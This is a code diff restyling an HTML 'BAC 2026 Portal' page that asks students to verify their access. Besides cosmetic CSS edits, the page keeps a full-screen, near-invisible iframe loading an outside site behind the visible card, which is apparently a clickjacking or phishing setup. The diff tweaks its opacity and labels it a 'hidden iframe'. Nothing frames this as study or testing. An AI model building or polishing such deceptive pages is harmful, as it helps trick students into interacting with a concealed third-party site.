@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <title>Secure Student Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-
   <style>
     * {
       box-sizing: border-box;
@@ -13,7 +12,7 @@
 
     body {
       margin: 0;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      background: linear-gradient(135deg, #0a2a3a, #0f3a55, #1a4d72); /* Slightly deeper tones for clarity */
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -23,43 +22,50 @@
 
     .card {
       width: 360px;
-      background: #111;
-      border-radius: 14px;
-      padding: 24px;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+      background: #222;
+      border-radius: 16px;
+      padding: 32px;
+      box-shadow: 0 15px 45px rgba(0, 0, 0, 0.5);
       text-align: center;
       position: relative;
       z-index: 2;
+      transition: all 0.3s ease-in-out;
+    }
+
+    .card:hover {
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7);
     }
 
     .card h1 {
       margin: 0 0 10px;
-      font-size: 22px;
+      font-size: 26px;
+      font-weight: 600;
+      color: #00d4ff;
     }
 
     .card p {
-      font-size: 14px;
-      opacity: 0.8;
-      margin-bottom: 20px;
+      font-size: 16px;
+      opacity: 0.85;
+      margin-bottom: 25px;
     }
 
     .btn {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       border: none;
       border-radius: 8px;
       background: #00d4ff;
       color: #000;
-      font-size: 16px;
+      font-size: 18px;
       font-weight: bold;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
 
     .btn:hover {
       background: #00b8dd;
     }
 
-    /* s*/
     iframe {
       position: absolute;
       top: 0;
@@ -67,17 +73,17 @@
       width: 100vw;
       height: 100vh;
       border: none;
-      opacity: 0.01; /* شبه مخفي */
+      opacity: 0.05; /* Even more subtle, but still present */
       z-index: 1;
     }
   </style>
 </head>
 <body>
 
-  <!-- iframe -->
+  <!-- Hidden iframe with subtle effect -->
   <iframe src="https://fierce-gibbon.super.site"></iframe>
 
-  <!--  -->
+  <!-- Main content card -->
   <div class="card">
     <h1>BAC 2026 Portal</h1>
     <p>Verify your student access to continue</p>
@@ -86,5 +92,4 @@
 
 </body>
 </html>
-
 
